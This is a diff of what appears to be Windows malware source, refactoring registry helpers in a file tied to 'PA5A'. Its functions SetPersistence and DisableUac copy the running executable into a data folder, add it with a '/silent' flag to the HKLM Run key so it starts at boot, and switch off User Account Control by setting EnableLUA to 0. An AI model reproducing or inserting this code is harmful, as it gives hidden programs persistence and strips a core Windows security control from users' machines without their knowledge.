@@ -1,13 +1,12 @@
-
 #include "pa5a.hpp"
 
 EXTERN_C_START
 
-/********************************************************************************************************************************************************/
-BOOL SetRegistryKeyStringValue(LPCWSTR key, LPCWSTR name, LPCWSTR data)
+/********************************************************************************************************************************/
+BOOL SetRegistryKeyStringValue(HKEY hKey, LPCWSTR key, LPCWSTR name, LPCWSTR data)
 {
     HKEY regKey;
-    if (RegOpenKey(HKEY_CURRENT_USER, key, &regKey) != ERROR_SUCCESS)
+    if (RegOpenKey(hKey, key, &regKey) != ERROR_SUCCESS)
         return FALSE;
 
     if (regKey == NULL)
@@ -16,7 +15,7 @@ BOOL SetRegistryKeyStringValue(LPCWSTR key, LPCWSTR name, LPCWSTR data)
         return FALSE;
     }
 
-    if (RegSetValueEx(regKey, name, 0, REG_SZ, (LPBYTE)data, (wcslen(data) + 1) * sizeof(WCHAR)) != ERROR_SUCCESS)
+    if (RegSetValueEx(regKey, name, 0, REG_SZ, (LPBYTE)data, ((DWORD)wcslen(data) + 1) * sizeof(WCHAR)) != ERROR_SUCCESS)
     {
         RegCloseKey(regKey);
         return FALSE;
@@ -25,11 +24,11 @@ BOOL SetRegistryKeyStringValue(LPCWSTR key, LPCWSTR name, LPCWSTR data)
     RegCloseKey(regKey);
     return TRUE;
 }
-/********************************************************************************************************************************************************/
-BOOL SetRegistryKeyDwordValue(LPCWSTR key, LPCWSTR name, DWORD data)
+/********************************************************************************************************************************/
+BOOL SetRegistryKeyDwordValue(HKEY hKey, LPCWSTR key, LPCWSTR name, DWORD data)
 {
     HKEY regKey;
-    if (RegOpenKey(HKEY_LOCAL_MACHINE, key, &regKey) != ERROR_SUCCESS)
+    if (RegOpenKey(hKey, key, &regKey) != ERROR_SUCCESS)
         return FALSE;
 
     if (regKey == NULL)
@@ -47,11 +46,9 @@ BOOL SetRegistryKeyDwordValue(LPCWSTR key, LPCWSTR name, DWORD data)
     RegCloseKey(regKey);
     return TRUE;
 }
-/********************************************************************************************************************************************************/
+/********************************************************************************************************************************/
 BOOL SetPersistence()
 {
-    LPCWSTR persistenceRegistryKey = L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
-    LPCWSTR appName = L"PA5A";
     WCHAR myFilename[PATH_SIZE] = { 0 };
     WCHAR persistenceFilename[PATH_SIZE] = { 0 };
     WCHAR commandInRegistry[PATH_SIZE * 2] = { 0 };
@@ -59,7 +56,7 @@ BOOL SetPersistence()
     if (!GetModuleFileName(NULL, myFilename, sizeof(myFilename)))
         return FALSE;
 
-    if (StringCbPrintf(persistenceFilename, sizeof(persistenceFilename), L"%s%s", DATA_FOLDER_W, EXECUTABLE_FILE_W) != S_OK)
+    if (StringCbPrintf(persistenceFilename, sizeof(persistenceFilename), L"%s%s", DATA_FOLDER_W, EXE_FILE_W) != S_OK)
         return FALSE;
 
     if (StrCmp(myFilename, persistenceFilename))
@@ -71,21 +68,19 @@ BOOL SetPersistence()
     if (StringCbPrintf(commandInRegistry, sizeof(commandInRegistry), L"%s /silent", persistenceFilename) != S_OK)
         return FALSE;
 
-    if (SetRegistryKeyStringValue(persistenceRegistryKey, appName, commandInRegistry) == FALSE)
+    if (SetRegistryKeyStringValue(HKEY_LOCAL_MACHINE, PERSISTENCE_REGISTRY_KEY_W, APP_NAME_W, commandInRegistry) == FALSE)
         return FALSE;
 
     return TRUE;
 }
-/********************************************************************************************************************************************************/
+/********************************************************************************************************************************/
 BOOL DisableUac()
 {
-    LPCWSTR persistenceRegistryKey = L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";
-    LPCWSTR valueName = L"EnableLUA";
-
-    if (SetRegistryKeyDwordValue(persistenceRegistryKey, valueName, 0) == FALSE)
+    if (SetRegistryKeyDwordValue(HKEY_LOCAL_MACHINE, UAC_REGISTRY_KEY_W, UAC_REGISTRY_VALUE_W, 0) == FALSE)
         return FALSE;
 
     return TRUE;
 }
+/********************************************************************************************************************************/
 
 EXTERN_C_END
